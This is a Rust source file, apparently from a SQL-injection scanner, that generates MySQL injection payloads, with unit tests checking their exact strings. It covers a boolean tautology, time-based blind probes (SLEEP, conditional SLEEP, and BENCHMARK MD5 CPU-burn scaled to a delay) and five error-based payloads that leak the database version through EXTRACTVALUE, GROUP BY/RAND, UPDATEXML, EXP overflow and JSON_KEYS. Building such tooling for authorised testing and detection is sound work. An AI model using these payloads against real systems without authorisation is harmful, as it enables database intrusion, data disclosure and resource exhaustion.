#![deny(unsafe_code)]
#[must_use]
pub fn mysql_boolean_true(comment: &str) -> String {
    format!("' OR 1=1{comment}")
}
#[must_use]
pub fn mysql_time_payload(secs: u64) -> String {
    format!("' AND SLEEP({secs}) -- -")
}

/// Conditional variant: only sleeps when the condition holds.
#[must_use]
pub fn mysql_time_conditional(secs: u64) -> String {
    format!("' AND IF(1=1,SLEEP({secs}),0) -- -")
}

/// CPU-burn fallback for hardened stacks where `SLEEP()` is filtered but
/// stacked expressions still evaluate. Fixed iteration count (~seconds of
/// `MD5` churn); caller keeps the same `sleep_secs` for threshold math.
#[must_use]
pub fn mysql_time_benchmark() -> String {
    "' AND BENCHMARK(5000000,MD5(1)) -- -".to_owned()
}

/// Heavy-query CPU-burn with `secs`-scaled iterations: same `BENCHMARK`
/// channel as [`mysql_time_benchmark`], but the burn grows with the
/// requested delay so the time detector's `sleep_secs` threshold math
/// stays meaningful (`P0-5`: `secs` × 1M `MD5` rounds ≈ `secs` seconds on
/// commodity hardware, mirroring the SQLite `RANDOMBLOB` scaling).
#[must_use]
pub fn mysql_time_heavy(secs: u64) -> String {
    let iters = secs.saturating_mul(1_000_000).max(1_000_000);
    format!("' AND BENCHMARK({iters},MD5(1)) -- -")
}
#[must_use]
pub fn mysql_error_payload() -> String {
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e)) -- -".to_owned()
}

/// Canonical MySQL error-based set — legacy first (compat), then variants.
///
/// - `[0]` legacy `EXTRACTVALUE` (byte-identical to [`mysql_error_payload`])
/// - `[1]` legacy `GROUP BY` double (`COUNT(*)` + `FLOOR(RAND(0)*2)`)
/// - `UPDATEXML(1,CONCAT(0x7e,@@version),1)` — `XPATH syntax error` channel
/// - `EXP(~(...))` — `BIGINT UNSIGNED value is out of range` overflow channel
/// - `JSON_KEYS(...)` — `Invalid JSON text` channel (MySQL 5.7+)
#[must_use]
pub fn mysql_error_payloads() -> Vec<String> {
    vec![
        mysql_error_payload(),
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -"
            .to_owned(),
        "' AND UPDATEXML(1,CONCAT(0x7e,@@version,0x7e),1) -- -".to_owned(),
        "' AND EXP(~(SELECT * FROM (SELECT @@version)x)) -- -".to_owned(),
        "' AND (SELECT JSON_KEYS(CONCAT(0x7e,@@version,0x7e))) -- -".to_owned(),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn legacy_sleep_shape() {
        assert_eq!(mysql_time_payload(5), "' AND SLEEP(5) -- -");
    }

    #[test]
    fn conditional_shape() {
        assert_eq!(mysql_time_conditional(5), "' AND IF(1=1,SLEEP(5),0) -- -");
    }

    #[test]
    fn benchmark_shape() {
        assert_eq!(
            mysql_time_benchmark(),
            "' AND BENCHMARK(5000000,MD5(1)) -- -"
        );
    }

    #[test]
    fn heavy_scales_with_secs() {
        // P0-5: `secs`-scaled CPU burn, same channel, MySQL comment style.
        let p = mysql_time_heavy(5);
        assert_eq!(p, "' AND BENCHMARK(5000000,MD5(1)) -- -");
        let p1 = mysql_time_heavy(1);
        let p10 = mysql_time_heavy(10);
        assert!(p1.contains("BENCHMARK(1000000,MD5(1))"), "{p1}");
        assert!(p10.contains("BENCHMARK(10000000,MD5(1))"), "{p10}");
        assert!(p10.len() > p1.len());
        assert!(mysql_time_heavy(0).contains("BENCHMARK(1000000"), "floor");
    }
}
